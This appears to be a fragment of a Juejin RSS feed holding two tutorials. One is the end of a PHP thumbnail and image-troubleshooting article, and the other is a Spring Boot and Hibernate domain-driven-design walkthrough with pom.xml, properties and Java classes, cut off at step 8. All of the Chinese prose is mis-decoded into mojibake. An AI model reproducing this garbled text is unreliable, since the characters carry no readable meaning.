<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createThumbnail</span>(<span class="hljs-params"><span class="hljs-variable">$source</span>, <span class="hljs-variable">$target</span>, <span class="hljs-variable">$thumbWidth</span></span>) </span>{
    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>) = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$thumbHeight</span> = (<span class="hljs-variable">$thumbWidth</span> / <span class="hljs-variable">$originalWidth</span>) * <span class="hljs-variable">$originalHeight</span>;
    
    <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$source</span>);
    <span class="hljs-variable">$thumb</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-variable">$thumbWidth</span>, <span class="hljs-variable">$thumbHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagecopyresized</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-variable">$image</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$thumbWidth</span>, <span class="hljs-variable">$thumbHeight</span>, <span class="hljs-variable">$originalWidth</span>, <span class="hljs-variable">$originalHeight</span>);
    
    <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-variable">$target</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);
    <span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$thumb</span>);
}
</code></pre>
<p>è¿™ä¸ªå‡½æ•°æŒ‰æŒ‡å®šå®½åº¦ç”Ÿæˆç¼©ç•¥å›¾ï¼ŒåŒæ—¶ä¿æŒåŸå›¾çš„å®½é«˜æ¯”ã€‚</p>
<h3 data-id="heading-12">å¸¸è§é—®é¢˜æ’æŸ¥</h3>
<p>å›¾åƒå¤„ç†æœ‰æ—¶ä¼šé‡åˆ°ä¸€äº›é—®é¢˜ï¼Œè¿™é‡Œåˆ—å‡ºå‡ ä¸ªå¸¸è§çš„ã€‚</p>
<h4 data-id="heading-13">å›¾åƒæŸå</h4>
<p>å¦‚æœ PHP æ— æ³•æ­£ç¡®å¤„ç†å›¾åƒæ–‡ä»¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´æŸåã€‚å¤„ç†å‰å…ˆç”¨ <code>getimagesize()</code> éªŒè¯æ–‡ä»¶æ˜¯å¦ä¸ºæœ‰æ•ˆå›¾åƒï¼ŒåŒæ—¶ç¡®è®¤æ–‡ä»¶æ ¼å¼ï¼ˆJPEGã€PNGã€GIFï¼‰ã€‚</p>
<h4 data-id="heading-14">å†…å­˜ä¸è¶³</h4>
<p>å¤„ç†å¤§å›¾ç‰‡æ—¶å¯èƒ½ä¼šé‡åˆ°å†…å­˜é™åˆ¶ã€‚å¯ä»¥åœ¨ <code>php.ini</code> ä¸­è°ƒæ•´ <code>memory_limit</code>ã€‚å¦‚æœæ˜¯å…±äº«ä¸»æœºï¼Œå¯èƒ½éœ€è¦è”ç³»æœåŠ¡å•†æå‡é…é¢ã€‚</p>
<h3 data-id="heading-15">æ€»ç»“</h3>
<p>PHP çš„å›¾åƒå¤„ç†èƒ½åŠ›è¿œä¸æ­¢ä¸Šä¼ é‚£ä¹ˆç®€å•ã€‚å€ŸåŠ© GD å’Œ Imagickï¼Œä½ å¯ä»¥å®Œæˆç¼©æ”¾ã€è£å‰ªã€åŠ æ°´å°ã€åº”ç”¨æ»¤é•œç­‰æ“ä½œã€‚æ— è®ºæ˜¯æ­å»ºå›¾ç‰‡åº“ã€å¤„ç†ç”¨æˆ·ä¸Šä¼ çš„å†…å®¹ï¼Œè¿˜æ˜¯ä¼˜åŒ–ç½‘ç«™å›¾ç‰‡ï¼Œè¿™äº›æŠ€èƒ½éƒ½èƒ½æ´¾ä¸Šç”¨åœºã€‚
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Fopenclaw-installed" target="_blank" title="https://catchadmin.com/post/2026-01/openclaw-installed" ref="nofollow noopener noreferrer">ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ75ï¼‰å¦‚ä½•åœ¨DDDï¼ˆé¢†åŸŸé©±åŠ¨è®¾è®¡ï¼‰ä¸­ä½¿ç”¨Hibernateï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600787795478462510</link>    <guid>https://juejin.cn/post/7600787795478462510</guid>    <pubDate>2026-01-30T23:40:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795478462510" data-draft-id="7601028900886282286" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ75ï¼‰å¦‚ä½•åœ¨DDDï¼ˆé¢†åŸŸé©±åŠ¨è®¾è®¡ï¼‰ä¸­ä½¿ç”¨Hibernateï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T23:40:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ75ï¼‰å¦‚ä½•åœ¨DDDï¼ˆé¢†åŸŸé©±åŠ¨è®¾è®¡ï¼‰ä¸­ä½¿ç”¨Hibernateï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T23:40:03.000Z" title="Fri Jan 30 2026 23:40:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨é¢†åŸŸé©±åŠ¨è®¾è®¡ï¼ˆDDDï¼‰ä¸­ä½¿ç”¨Hibernateï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤å®ç°ã€‚DDDå…³æ³¨çš„æ˜¯å°†ä¸šåŠ¡é€»è¾‘å°è£…åœ¨é¢†åŸŸå¯¹è±¡å’Œé¢†åŸŸæœåŠ¡ä¸­ï¼Œå¹¶é€šè¿‡å­˜å‚¨åº“ï¼ˆRepositoryï¼‰æ¨¡å¼å¤„ç†æŒä¹…åŒ–ã€‚Hibernateä½œä¸ºORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰å·¥å…·ï¼Œå¯ä»¥å¾ˆå¥½åœ°å¤„ç†é¢†åŸŸå¯¹è±¡çš„æŒä¹…åŒ–ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬å±•ç¤ºå¦‚ä½•åœ¨Spring Booté¡¹ç›®ä¸­ç»“åˆHibernateå®ç°DDDã€‚</p>
<h3 data-id="heading-0">1. é¡¹ç›®ä¾èµ–</h3>
<p>åœ¨<code>pom.xml</code>ä¸­æ·»åŠ å¿…è¦çš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data JPA --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL Connector --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- HikariCP for Connection Pooling --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Web --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Lombok --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-1">2. é…ç½®æ•°æ®æºå’ŒHibernateå±æ€§</h3>
<p>åœ¨<code>application.properties</code>ä¸­é…ç½®æ•°æ®æºï¼š</p>
<pre><code class="hljs language-properties" lang="properties"># MySQL Database Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/mydatabase
spring.datasource.username=root
spring.datasource.password=rootpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect
</code></pre>
<h3 data-id="heading-2">3. åˆ›å»ºé¢†åŸŸæ¨¡å‹</h3>
<p>åœ¨DDDä¸­ï¼Œé¢†åŸŸæ¨¡å‹ä»£è¡¨ä¸šåŠ¡æ¦‚å¿µå’Œè§„åˆ™ã€‚</p>
<h4 data-id="heading-3"><code>Order.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;

    <span class="hljs-meta">@OneToMany(cascade = CascadeType.ALL, orphanRemoval = true)</span>
    <span class="hljs-meta">@JoinColumn(name = "order_id")</span>
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.add(item);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.remove(item);
    }

    <span class="hljs-comment">// Business logic methods</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculateTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> items.stream().mapToDouble(OrderItem::getTotalPrice).sum();
    }
}
</code></pre>
<h4 data-id="heading-4"><code>OrderItem.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "order_items")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderItem</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity * price;
    }
}
</code></pre>
<h3 data-id="heading-5">4. åˆ›å»ºä»“å‚¨æ¥å£</h3>
<p>ä»“å‚¨æ¥å£ç”¨äºæŒä¹…åŒ–é¢†åŸŸå¯¹è±¡ã€‚</p>
<h4 data-id="heading-6"><code>OrderRepository.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; {
}
</code></pre>
<h3 data-id="heading-7">5. åˆ›å»ºé¢†åŸŸæœåŠ¡</h3>
<p>é¢†åŸŸæœåŠ¡ç”¨äºå¤„ç†å¤æ‚çš„ä¸šåŠ¡é€»è¾‘ï¼Œé€šå¸¸æ¶‰åŠå¤šä¸ªé¢†åŸŸå¯¹è±¡ã€‚</p>
<h4 data-id="heading-8"><code>OrderService.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderRepository orderRepository;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderRepository.deleteById(id);
    }

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-keyword">return</span> orderRepository.findById(id).orElse(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h3 data-id="heading-9">6. åˆ›å»ºåº”ç”¨æœåŠ¡</h3>
<p>åº”ç”¨æœåŠ¡è´Ÿè´£ä¸ç”¨æˆ·äº¤äº’ï¼Œå¹¶è°ƒåº¦é¢†åŸŸæœåŠ¡æ¥å¤„ç†ä¸šåŠ¡é€»è¾‘ã€‚</p>
<h4 data-id="heading-10"><code>OrderApplicationService.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderApplicationService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(String customerName, String customerAddress, List&lt;OrderItem&gt; items)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setCustomerName(customerName);
        order.setCustomerAddress(customerAddress);
        <span class="hljs-keyword">for</span> (OrderItem item : items) {
            order.addItem(item);
        }
        <span class="hljs-keyword">return</span> orderService.createOrder(order);
    }

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Long id, String customerName, String customerAddress, List&lt;OrderItem&gt; items)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.getOrderById(id);
        <span class="hljs-keyword">if</span> (order == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Order not found"</span>);
        }
        order.setCustomerName(customerName);
        order.setCustomerAddress(customerAddress);
        order.getItems().clear();
        <span class="hljs-keyword">for</span> (OrderItem item : items) {
            order.addItem(item);
        }
        <span class="hljs-keyword">return</span> orderService.updateOrder(order);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderService.deleteOrder(id);
    }

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-keyword">return</span> orderService.getOrderById(id);
    }
}
</code></pre>
<h3 data-id="heading-11">7. åˆ›å»ºæ§åˆ¶å™¨</h3>
<p>æ§åˆ¶å™¨è´Ÿè´£å¤„ç†HTTPè¯·æ±‚ï¼Œå¹¶ä¸åº”ç”¨æœåŠ¡äº¤äº’ã€‚</p>
<h4 data-id="heading-12"><code>OrderController.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderApplicationService orderApplicationService;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> CreateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">createdOrder</span> <span class="hljs-operator">=</span> orderApplicationService.createOrder(
                request.getCustomerName(), request.getCustomerAddress(), request.getItems());
        <span class="hljs-keyword">return</span> ResponseEntity.ok(createdOrder);
    }

    <span class="hljs-meta">@PutMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id, <span class="hljs-meta">@RequestBody</span> UpdateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderApplicationService.updateOrder(
                id, request.getCustomerName(), request.getCustomerAddress(), request.getItems());
        <span class="hljs-keyword">return</span> ResponseEntity.ok(updatedOrder);
    }

    <span class="hljs-meta">@DeleteMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Void&gt; <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        orderApplicationService.deleteOrder(id);
        <span class="hljs-keyword">return</span> ResponseEntity.noContent().build();
    }

    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderApplicationService.getOrderById(id);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(order);
    }
}
</code></pre>
<h4 data-id="heading-13"><code>CreateOrderRequest.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h4 data-id="heading-14"><code>UpdateOrderRequest.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UpdateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h3 data-id="heading-15">8. è¿è¡Œåº”ç”¨</h3>
<ol>
